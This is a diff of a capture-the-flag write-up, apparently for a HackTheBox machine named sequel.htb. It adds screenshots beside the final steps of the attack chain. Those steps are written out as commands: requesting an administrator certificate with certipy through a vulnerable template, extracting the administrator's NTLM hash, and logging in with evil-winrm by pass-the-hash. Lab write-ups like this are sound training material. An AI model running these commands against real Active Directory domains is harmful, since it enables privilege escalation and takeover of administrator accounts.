@@ -95,10 +95,18 @@ Connect to our SMB server using xp_dirtree
 
 `certipy req -ca 'sequel-DC-CA' -dc-ip 10.129.228.253 -u ryan.cooper -p $(cat ../user/ryan.cooper.pass) -template UserAuthentication -target dc.sequel.htb -upn 'administrator@sequel.htb'`
 
+<img width="908" height="202" alt="image" src="https://github.com/user-attachments/assets/490ee504-0c7d-4e8a-b60c-f414f1fb6f2b" />
+
 13. Using the certificate, we get the NTLM hash for the administrator account
 
 `certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253`
 
+<img width="895" height="206" alt="image" src="https://github.com/user-attachments/assets/2b65bcfa-d390-4ee4-96b7-5958ff19500d" />
+
 14. Lastly, we perform a Pass the Hash attack to login as administrator and get the root flag!
 
 `evil-winrm -i sequel.htb -u administrator -H $(cat administrator.hash)`
+
+<img width="509" height="238" alt="image" src="https://github.com/user-attachments/assets/6042a093-4377-4c25-ba46-6fe6cd16824a" />
+
+
